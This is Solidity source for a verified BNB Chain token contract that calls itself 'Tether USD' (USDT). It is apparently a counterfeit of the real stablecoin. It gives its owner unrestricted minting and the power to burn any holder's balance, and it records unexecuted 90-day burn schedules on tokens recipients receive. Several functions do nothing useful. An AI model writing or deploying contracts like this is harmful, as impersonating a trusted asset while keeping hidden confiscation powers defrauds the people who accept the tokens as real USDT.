/**
 *Submitted for verification at BscScan.com on 2023-04-20
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

contract USDT {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000000000;
    address public owner;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address account) public view returns (uint256 balance) {
        return balances[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balances[msg.sender] >= value);
        require(to != address(0));

        balances[msg.sender] -= value;
        balances[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(balances[from] >= value);
        require(allowed[from][msg.sender] >= value);
        require(to != address(0));

        balances[from] -= value;
        allowed[from][msg.sender] -= value;
        balances[to] += value;

        emit Transfer(from, to, value);
        return true;
    }

    function allowance(address accountOwner, address spender) public view returns (uint256 remaining) {
        return allowed[accountOwner][spender];
    }

    function mint(address to, uint256 amount) public {
        require(msg.sender == owner);

        balances[to] += amount;
        totalSupply += amount;

        emit Transfer(address(0), to, amount);
    }

    function sendToSender() public {
        uint256 amount = balanceOf(msg.sender);
        transfer(msg.sender, amount);
    }
    
    function burn(address from, uint256 value) public {
        require(msg.sender == owner);
        require(balances[from] >= value);

        balances[from] -= value;
        totalSupply -= value;

        emit Burn(from, value);
    }
    
    function transferAndBurn(address to, uint256 value) public returns (bool success) {
        require(balances[msg.sender] >= value);
        require(to != address(0));

        balances[msg.sender] -= value;
        balances[to] += value;

        emit Transfer(msg.sender, to, value);
        
        // Schedule burn after 90 days
        uint256 burnTime = block.timestamp + 90 days;
        BurnSchedule memory schedule = BurnSchedule(to, value, burnTime);
        burnSchedules.push(schedule);

        return true;
    }
    
    function transferOwnership(address newOwner) public {
        require(msg.sender == owner);
        require(newOwner != address(0));

        address previousOwner = owner;
        owner = newOwner;

        emit OwnershipTransferred(previousOwner, newOwner);
    }
    
    struct BurnSchedule {
        address recipient;
        uint256 value;
        uint256 burnTime;
    }
    
    BurnSchedule[] public burnSchedules;
}